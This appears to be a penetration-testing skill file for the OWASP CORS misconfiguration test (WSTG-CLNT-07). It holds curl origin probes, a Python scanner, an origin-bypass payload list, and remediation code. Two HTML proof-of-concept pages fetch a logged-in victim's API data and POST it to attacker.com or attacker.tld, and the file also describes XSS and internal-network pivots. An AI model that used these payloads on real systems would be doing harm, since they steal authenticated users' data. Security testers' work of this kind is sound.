---
name: wstg-clnt-07
description: "Testing for Cross-Origin Resource Sharing (CORS)"
category: client-side
owasp_id: WSTG-CLNT-07
version: "1.0.0"
author: cyberstrike-official
tags: [client-side, javascript, dom, cors, wstg, clnt]
tech_stack: [cors, javascript]
cwe_ids: [CWE-942]
chains_with: [wstg-clnt-13, wstg-clnt-01]
prerequisites: [wstg-conf-01, wstg-conf-02]
severity_boost: {}
---

# wstg-clnt-07

## Test ID

WSTG-CLNT-07

## Test Name

Testing for Cross-Origin Resource Sharing (CORS)

## High-Level Description

CORS is a browser mechanism that allows controlled access to resources from different origins. Misconfigured CORS policies can allow malicious websites to read sensitive data from authenticated users, leading to data theft.

---

## What to Check

- [ ] Wildcard (\*) Access-Control-Allow-Origin
- [ ] Origin reflection without validation
- [ ] null origin acceptance
- [ ] Credentials with permissive CORS
- [ ] Internal endpoints exposed

---

## How to Test

### Step 1: Test CORS Headers

```bash
#!/bin/bash
TARGET="https://target.com/api/user"

# Test with attacker origin
curl -sI -H "Origin: https://evil.com" "$TARGET" | grep -i "access-control"

# Test with null origin
curl -sI -H "Origin: null" "$TARGET" | grep -i "access-control"

# Test with subdomain
curl -sI -H "Origin: https://sub.target.com" "$TARGET" | grep -i "access-control"

# Test reflection
curl -sI -H "Origin: https://target.com.evil.com" "$TARGET" | grep -i "access-control"
```

### Step 2: CORS Exploitation PoC

```html
<!-- Host this on attacker.com -->
<!DOCTYPE html>
<html>
  <body>
    <script>
      // If CORS allows evil.com, this will work
      fetch("https://target.com/api/user", {
        credentials: "include",
      })
        .then((response) => response.json())
        .then((data) => {
          // Send stolen data to attacker
          fetch("https://attacker.com/log", {
            method: "POST",
            body: JSON.stringify(data),
          })
        })
    </script>
  </body>
</html>
```

### Step 3: CORS Tester

```python
#!/usr/bin/env python3
import requests

class CORSTester:
    def __init__(self, url):
        self.url = url
        self.findings = []

    def test_cors(self):
        """Test CORS configuration"""
        print(f"[*] Testing CORS on {self.url}")

        test_origins = [
            ("https://evil.com", "Arbitrary origin"),
            ("null", "Null origin"),
            ("https://target.com.evil.com", "Suffix match bypass"),
            ("https://eviltarget.com", "Prefix/suffix confusion"),
        ]

        for origin, description in test_origins:
            headers = {"Origin": origin}
            response = requests.get(self.url, headers=headers)

            acao = response.headers.get("Access-Control-Allow-Origin", "")
            acac = response.headers.get("Access-Control-Allow-Credentials", "")

            if origin in acao or acao == "*":
                severity = "High" if acac.lower() == "true" else "Medium"
                print(f"[VULN] {description}: ACAO={acao}, ACAC={acac}")
                self.findings.append({
                    "origin": origin,
                    "description": description,
                    "acao": acao,
                    "credentials": acac,
                    "severity": severity
                })

    def generate_report(self):
        print("\n" + "="*50)
        print("CORS SECURITY REPORT")
        print("="*50)

        if not self.findings:
            print("\nNo CORS issues found.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['description']}")
                print(f"  Origin: {f['origin']}")
                print(f"  ACAO: {f['acao']}")

# Usage
tester = CORSTester("https://target.com/api/user")
tester.test_cors()
tester.generate_report()
```

---

## Tools

| Tool                    | Purpose                                            |
| ------------------------ | ----------------------------------------------------- |
| **Burp Suite**            | Fuzz `Origin` header, replay with CORS PoC extension    |
| **CORScanner**            | Automated CORS misconfiguration scanner                |
| **Corsy**                 | Fast CORS misconfiguration scanner                     |
| **curl**                  | Manual `Origin` header probing                         |

---

## Example Commands/Payloads

### Origin header probes

```bash
TARGET="https://{target}/api/user"
curl -sI -H "Origin: https://attacker.tld" "$TARGET" | grep -i "access-control"
curl -sI -H "Origin: null" "$TARGET" | grep -i "access-control"
curl -sI -H "Origin: https://sub.{target}" "$TARGET" | grep -i "access-control"
curl -sI -H "Origin: https://{target}.attacker.tld" "$TARGET" | grep -i "access-control"
curl -sI -H "Origin: https://attacker{target}" "$TARGET" | grep -i "access-control"
```

### Origin bypass payload list (from PayloadsAllTheThings)

```
https://attacker.tld
https://{target}.attacker.tld
https://attacker{target}
https://attacker.tld?{target}
https://{target}%60.attacker.tld
null
https://{target}-attacker.tld
```

### Exploitation PoC (host on attacker.tld)

```html
<!DOCTYPE html>
<html>
  <body>
    <script>
      fetch("https://{target}/api/user", { credentials: "include" })
        .then((r) => r.json())
        .then((data) =>
          fetch("https://attacker.tld/log", { method: "POST", body: JSON.stringify(data) })
        )
    </script>
  </body>
</html>
```

### Regex-bypass / unescaped-dot origin validation

If `{target}` validates `Origin` with a poorly anchored or unescaped regex (e.g. `^api.target.tld$` instead of `^api\.target\.tld$`), the literal `.` matches ANY character:

```bash
curl -sI -H "Origin: https://apiXtarget.tld" "https://{target}/api/user" | grep -i "access-control"
```

### XSS-on-trusted-origin escalation

When `Access-Control-Allow-Origin` uses a strict allowlist (arbitrary-origin PoC above fails), check whether any *allowlisted* origin (e.g. a marketing subdomain, staging environment) has an independent XSS — injecting the CORS-exploitation PoC through that XSS bypasses the allowlist entirely:

```
https://trusted-subdomain.{target}/?xss=<script>/* CORS exfil PoC from above, run from the trusted origin */</script>
```

### Internal-network wildcard pivot (no credentials, but no auth required either)

```bash
# Wildcard ACAO on an internal-only API is still exploitable if the endpoint itself needs no auth -
# the attacker's public page pivots through the victim's browser into the internal network
curl -sI -H "Origin: https://attacker.tld" "http://internal-api.{target}/endpoint" | grep -i "access-control-allow-origin: \*"
```

---

## Remediation

```python
# Proper CORS configuration
ALLOWED_ORIGINS = ['https://trusted.com', 'https://app.trusted.com']

@app.after_request
def add_cors_headers(response):
    origin = request.headers.get('Origin')

    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'

    return response
```

---

## Risk Assessment

| Finding                                  | CVSS | Severity |
| ---------------------------------------- | ---- | -------- |
| CORS with credentials + arbitrary origin | 8.1  | High     |
| Wildcard CORS without credentials        | 5.3  | Medium   |
| null origin accepted                     | 6.5  | Medium   |

---

## CWE Categories

| CWE ID      | Title                                                 |
| ----------- | ----------------------------------------------------- |
| **CWE-942** | Permissive Cross-domain Policy with Untrusted Domains |


---

## References

- [OWASP WSTG - Testing Cross Origin Resource Sharing (WSTG-CLNT-07)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing)
- [PayloadsAllTheThings - CORS Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
- [PortSwigger - CORS vulnerabilities](https://portswigger.net/web-security/cors)

---

## Checklist

```
[ ] CORS headers analyzed
[ ] Arbitrary origins tested
[ ] null origin tested
[ ] Credentials header checked
[ ] PoC created if vulnerable
[ ] Findings documented
```
